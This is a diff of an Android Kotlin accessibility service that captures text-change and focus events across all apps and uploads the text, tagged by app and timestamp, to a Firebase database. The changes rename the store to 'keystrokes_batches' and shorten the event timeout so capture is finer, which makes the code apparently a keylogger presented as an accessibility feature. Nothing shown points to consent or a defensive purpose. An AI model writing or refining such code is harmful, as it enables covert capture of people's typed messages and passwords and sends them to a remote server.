@@ -20,7 +20,7 @@ class AppAccessibilityService : AccessibilityService() {
         private const val TAG = "AppAccessibilityService"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("accessibility_text_batches")
+            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -34,7 +34,7 @@ class AppAccessibilityService : AccessibilityService() {
                 eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-                notificationTimeout = 1000
+                notificationTimeout = 100
             }
             serviceInfo = info
             Log.d(TAG, "Accessibility Service Connected Successfully")
@@ -66,7 +66,7 @@ class AppAccessibilityService : AccessibilityService() {
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child(sanitizedAppName).child(timestampKey).setValue(eventData)
+                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Accessibility text synced to Firebase successfully")
                         }
